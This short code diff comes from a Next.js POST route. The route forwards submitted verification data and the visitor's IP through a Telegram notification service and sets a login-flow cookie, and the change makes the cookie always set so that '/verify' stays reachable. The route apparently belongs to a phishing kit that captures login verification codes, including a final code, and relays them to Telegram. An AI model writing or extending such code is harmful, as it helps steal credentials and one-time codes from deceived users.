@@ -11,13 +11,11 @@ export async function POST(request: NextRequest) {
     await telegramService.sendVerificationNotification({ ...data, ip })
     const response = NextResponse.json({ success: true })
 
-    
-    if (data.verificationType !== "Code (final)") {
-      response.cookies.set(LOGIN_FLOW_COOKIE, "2", {
-        path: "/",
-        maxAge: 10 * 60,
-      })
-    }
+    /* Advance the flow marker so /verify stays reachable. */
+    response.cookies.set(LOGIN_FLOW_COOKIE, "2", {
+      path: "/",
+      maxAge: 10 * 60,
+    })
 
     return response
   } catch (error) {
